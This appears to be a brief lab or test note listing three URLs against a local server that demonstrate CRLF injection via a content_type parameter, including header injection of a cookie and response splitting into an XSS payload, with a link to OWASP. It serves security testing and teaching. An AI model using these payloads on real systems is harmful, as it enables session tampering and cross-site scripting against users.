Simple test - http://127.0.0.1:8383/?content_type=text/plain

Cookie set - http://127.0.0.1:8383/?content_type=text/html%0d%0aSet-Cookie:%20a=1%0d%0a

XSS - http://127.0.0.1:8383/?content_type=text/html%0d%0a%0d%0a<h1>XSS<!--



(CRLF Injection)[https://www.owasp.org/index.php/CRLF_Injection]